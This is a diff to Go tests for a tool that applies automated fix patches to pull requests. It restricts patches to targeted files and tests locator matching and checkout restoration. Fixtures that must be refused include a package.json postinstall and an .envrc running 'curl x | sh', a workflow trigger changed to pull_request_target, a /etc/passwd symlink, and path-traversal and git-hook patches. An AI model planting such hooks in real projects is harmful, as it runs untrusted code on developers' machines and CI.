@@ -23,7 +23,7 @@ func TestApplyFixPatchAndSelectChangedUnit(t *testing.T) {
 		t.Fatal(err)
 	}
 	patch := "diff --git a/a.go b/a.go\n--- a/a.go\n+++ b/a.go\n@@ -3 +3 @@\n-func f() int { return 0 }\n+func f() int { return 1 }\n"
-	changed, err := applyFixPatch(context.Background(), dir, patch)
+	changed, err := applyFixPatch(context.Background(), dir, patch, targetSet("a.go"))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -237,7 +237,7 @@ func TestApplyFixPatchTouchesWhereItApplied(t *testing.T) {
 		t.Fatal(err)
 	}
 	patch := "diff --git a/a.txt b/a.txt\n--- a/a.txt\n+++ b/a.txt\n@@ -2,3 +2,3 @@\n line 24\n-line 25\n+line twenty-five\n line 26\n"
-	changed, err := applyFixPatch(context.Background(), dir, patch)
+	changed, err := applyFixPatch(context.Background(), dir, patch, targetSet("a.txt"))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -479,7 +479,7 @@ func TestApplyFixPatchMixedFormat(t *testing.T) {
 	patch := "diff --git a/a.go b/a.go\n--- a/a.go\n+++ b/a.go\n@@ -3 +3 @@\n-func f() int { return 0 }\n+func f() int { return 1 }\n" +
 		"*** Update File: b.go\n--- a/b.go\n+++ b/b.go\n@@ -3,7 +3,9 @@\n-func g() int { return 0 }\n+func g() int { return 1 }\n" +
 		"*** Add File: c.go\n+package a\n+\n+func h() {}\n*** End Patch"
-	changed, err := applyFixPatch(context.Background(), dir, patch)
+	changed, err := applyFixPatch(context.Background(), dir, patch, targetSet("a.go", "b.go", "c.go"))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -638,7 +638,7 @@ func TestApplyFixPatchPlainDiff(t *testing.T) {
 	patch := "--- a/a.go\t2026-01-01 00:00:00\n+++ b/a.go\t2026-01-01 00:00:00\n@@ -3 +3 @@\n-func f() int { return 0 }\n+func f() int { return 1 }\n" +
 		"--- /dev/null\n+++ b/new.go\n@@ -0,0 +1 @@\n+package a\n" +
 		"--- a/old.go\n+++ /dev/null\n@@ -1 +0,0 @@\n-package a\n"
-	changed, err := applyFixPatch(context.Background(), dir, patch)
+	changed, err := applyFixPatch(context.Background(), dir, patch, targetSet("a.go", "new.go", "old.go"))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -658,7 +658,7 @@ func TestApplyFixPatchPlainDiff(t *testing.T) {
 		"--- a/../x.go\n+++ b/../x.go\n@@ -1 +1 @@\n-a\n+b\n",
 		"--- /dev/null\n+++ b/.git/hooks/pre-commit\n@@ -0,0 +1 @@\n+#!/bin/sh\n",
 	} {
-		if _, err := applyFixPatch(context.Background(), dir, bad); err == nil || !strings.Contains(err.Error(), "unsafe") {
+		if _, err := applyFixPatch(context.Background(), dir, bad, targetSet("a.go", "../x.go", ".git/hooks/pre-commit")); err == nil || !strings.Contains(err.Error(), "unsafe") {
 			t.Errorf("applied %q: %v", bad, err)
 		}
 	}
@@ -684,7 +684,7 @@ func TestApplyFixPatchAutoCRLF(t *testing.T) {
 		// A CLI fixer that read the checkout can copy its "\r"s.
 		"diff --git a/a.go b/a.go\n--- a/a.go\n+++ b/a.go\n@@ -3,3 +3,3 @@\n func f() int {\r\n-\treturn 1\r\n+\treturn 2\r\n }\r\n",
 	} {
-		if _, err := applyFixPatch(context.Background(), dir, patch); err != nil {
+		if _, err := applyFixPatch(context.Background(), dir, patch, targetSet("a.go")); err != nil {
 			t.Fatalf("%q: %v", patch, err)
 		}
 	}
@@ -709,7 +709,7 @@ func TestApplyFixPatchCommittedCRLF(t *testing.T) {
 		"*** Begin Patch\n*** Update File: a.go\n@@ func f() int {\n-\treturn 0\n+\treturn 1\n }\n*** End Patch",
 		"--- a/a.go\n+++ b/a.go\n@@ -3,3 +3,4 @@\n func f() int {\n-\treturn 1\n+\t// two\n+\treturn 2\n }\n",
 	} {
-		if _, err := applyFixPatch(context.Background(), dir, patch); err != nil {
+		if _, err := applyFixPatch(context.Background(), dir, patch, targetSet("a.go")); err != nil {
 			t.Fatalf("%q: %v", patch, err)
 		}
 	}
@@ -751,5 +751,157 @@ func TestFixPipelineIgnoresStrippedAgentFiles(t *testing.T) {
 	}
 	if st := strings.TrimSpace(git("status", "--porcelain")); st != "M a.go" {
 		t.Errorf("status = %q", st)
+	}
+}
+
+func targetSet(paths ...string) map[string]bool {
+	out := map[string]bool{}
+	for _, p := range paths {
+		out[p] = true
+	}
+	return out
+}
+
+// A patch may only change the files the fix targets: changes to other
+// files, renames, deletes, new files and symlinks are refused, with the
+// paths named for the retry, and nothing is applied.
+func TestApplyFixPatchOnlyTargetedFiles(t *testing.T) {
+	dir, git := gitRepo(t)
+	files := map[string]string{"a.go": "package a\n\nfunc f() int { return 0 }\n", "package.json": "{}\n", "Makefile": "all:\n", ".github/workflows/ci.yml": "on: push\n"}
+	for name, body := range files {
+		if err := os.MkdirAll(filepath.Dir(filepath.Join(dir, name)), 0o755); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+	git("add", ".")
+	git("commit", "-qm", "base")
+	fixA := "diff --git a/a.go b/a.go\n--- a/a.go\n+++ b/a.go\n@@ -3 +3 @@\n-func f() int { return 0 }\n+func f() int { return 1 }\n"
+	for _, tc := range []struct{ patch, want string }{
+		{fixA + "diff --git a/package.json b/package.json\n--- a/package.json\n+++ b/package.json\n@@ -1 +1 @@\n-{}\n+{\"scripts\": {\"postinstall\": \"curl x | sh\"}}\n", `"package.json"`},
+		{"--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml\n@@ -1 +1 @@\n-on: push\n+on: pull_request_target\n", `".github/workflows/ci.yml"`},
+		{"*** Begin Patch\n*** Add File: .envrc\n+curl x | sh\n*** End Patch", `".envrc"`},
+		{"--- a/Makefile\n+++ /dev/null\n@@ -1 +0,0 @@\n-all:\n", `"Makefile"`},
+		{"diff --git a/a.go b/b.go\nsimilarity index 90%\nrename from a.go\nrename to b.go\n--- a/a.go\n+++ b/b.go\n@@ -3 +3 @@\n-func f() int { return 0 }\n+func f() int { return 1 }\n", `"b.go"`},
+		{"diff --git a/a.go b/a.go\ndeleted file mode 100644\n--- a/a.go\n+++ /dev/null\n@@ -1,3 +0,0 @@\n-package a\n-\n-func f() int { return 0 }\ndiff --git a/a.go b/a.go\nnew file mode 120000\n--- /dev/null\n+++ b/a.go\n@@ -0,0 +1 @@\n+/etc/passwd\n\\ No newline at end of file\n", "symlink"},
+	} {
+		_, err := applyFixPatch(context.Background(), dir, tc.patch, targetSet("a.go"))
+		if err == nil || !strings.Contains(err.Error(), tc.want) {
+			t.Errorf("%q: err = %v, want it to name %s", tc.patch, err, tc.want)
+		}
+	}
+	if st := git("status", "--porcelain"); st != "" {
+		t.Fatalf("a refused patch changed the checkout: %q", st)
+	}
+	if _, err := applyFixPatch(context.Background(), dir, fixA, targetSet("a.go")); err != nil {
+		t.Fatal(err)
+	}
+	if st := git("status", "--porcelain"); strings.TrimSpace(st) != "M a.go" {
+		t.Errorf("status = %q", st)
+	}
+}
+
+// An apply_patch hunk goes at the first match of its lines after its
+// locator line, not at the nearest match git apply would pick, which can
+// be before it; one whose lines aren't after the locator is refused.
+func TestApplyFixPatchLocatorSearchesForward(t *testing.T) {
+	dir, git := gitRepo(t)
+	body := "package p\n\nfunc a() int {\n\tx := 1\n\treturn x\n}\n\nfunc b() int {\n" + strings.Repeat("\t_ = 0\n", 8) + "\tx := 1\n\treturn x\n}\n"
+	if err := os.WriteFile(filepath.Join(dir, "p.go"), []byte(body), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	git("add", ".")
+	git("commit", "-qm", "base")
+	patch := "*** Begin Patch\n*** Update File: p.go\n@@ func b() int {\n-\tx := 1\n+\tx := 3\n \treturn x\n*** End Patch"
+	if _, err := applyFixPatch(context.Background(), dir, patch, targetSet("p.go")); err != nil {
+		t.Fatal(err)
+	}
+	want := strings.Replace(body, "\tx := 1\n\treturn x\n}\n", "\tx := 3\n\treturn x\n}\n", 2)
+	want = strings.Replace(want, "\tx := 3\n", "\tx := 1\n", 1) // a() keeps its line
+	if b, _ := os.ReadFile(filepath.Join(dir, "p.go")); strings.ReplaceAll(string(b), "\r\n", "\n") != want {
+		t.Errorf("p.go = %q, want %q", b, want)
+	}
+
+	git("checkout", "--", "p.go")
+	missing := "*** Begin Patch\n*** Update File: p.go\n@@ func b() int {\n-\tx := 1\n+\tx := 3\n \treturn x + 0\n*** End Patch"
+	if _, err := applyFixPatch(context.Background(), dir, missing, targetSet("p.go")); err == nil || !strings.Contains(err.Error(), "not in the file after that line") {
+		t.Errorf("hunk not after its locator: %v", err)
+	}
+	if st := git("status", "--porcelain"); st != "" {
+		t.Errorf("refused hunk changed the file: %q", st)
+	}
+}
+
+// A fix that checked out a reviewed revision and failed puts the checkout
+// back on its branch and deletes the branch it made, unless the checkout
+// changed since; then it stays, and the error says where it is.
+func TestCheckoutRevRestore(t *testing.T) {
+	dir, git := gitRepo(t)
+	if err := os.WriteFile(filepath.Join(dir, "a.txt"), []byte("one\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	git("add", ".")
+	git("commit", "-qm", "one")
+	first := strings.TrimSpace(git("rev-parse", "HEAD"))
+	if err := os.WriteFile(filepath.Join(dir, "a.txt"), []byte("two\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	git("commit", "-qam", "two")
+	git("branch", "-M", "main")
+	rev := &triage.PRInfo{LocalPath: dir, Rev: first[:10], HeadRef: first[:10], HeadOid: first, SingleCommit: true}
+	branch := "pr-manager/" + first[:10]
+	head := func() string { return strings.TrimSpace(git("symbolic-ref", "--short", "HEAD")) }
+
+	// A fix that fails with the checkout as it left it.
+	tr, err := newTriager(options{cache: t.TempDir()})
+	if err != nil {
+		t.Fatal(err)
+	}
+	u := &triage.Unit{ID: "a.txt", File: "a.txt", Issues: []triage.Issue{{Severity: "medium", Title: "x"}}}
+	res := &PRResult{Key: "local__rev", PR: rev, Files: []resultFile{{FileDiff: triage.FileDiff{Path: "a.txt"}, Units: []resultUnit{{Unit: u}}}}}
+	req := fixRequest{Key: res.Key, All: true, MaxRounds: 1, Rev: "checkout", jobOptions: jobOptions{Summarizer: "no-such-provider"}}
+	_, err = tr.runFix(context.Background(), "job1", res, req, func(string, int, int) {})
+	if err == nil || !strings.Contains(err.Error(), "switched back to main") {
+		t.Fatalf("failed fix: %v", err)
+	}
+	if head() != "main" {
+		t.Errorf("checkout on %s after a failed fix", head())
+	}
+	if out, _ := triage.Git(dir, "branch", "--list", branch); strings.TrimSpace(out) != "" {
+		t.Errorf("created branch kept: %q", out)
+	}
+
+	// Changes in the checkout since: left as they are.
+	c, err := checkoutRevFor(rev)
+	if err != nil || c.branch != branch || !c.created {
+		t.Fatalf("checkout: %+v, %v", c, err)
+	}
+	if err := os.WriteFile(filepath.Join(dir, "a.txt"), []byte("edited\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if note := c.restore(); !strings.Contains(note, "now on "+branch) || head() != branch {
+		t.Errorf("dirty restore: %q, on %s", note, head())
+	}
+	git("checkout", "--", "a.txt")
+
+	// A commit on the branch since: it stays, and so does the checkout.
+	git("commit", "-q", "--allow-empty", "-m", "more")
+	if note := c.restore(); !strings.Contains(note, "left as it is") || head() != branch {
+		t.Errorf("restore after a commit: %q, on %s", note, head())
+	}
+
+	// A branch that was there already is switched from but kept.
+	git("switch", "-q", "main")
+	git("branch", "-f", branch, first)
+	if c, err = checkoutRevFor(rev); err != nil || c.created {
+		t.Fatalf("checkout existing branch: %+v, %v", c, err)
+	}
+	if note := c.restore(); note != "the checkout was switched back to main" || head() != "main" {
+		t.Errorf("restore: %q, on %s", note, head())
+	}
+	if out, _ := triage.Git(dir, "branch", "--list", branch); strings.TrimSpace(out) == "" {
+		t.Error("existing branch deleted")
 	}
 }
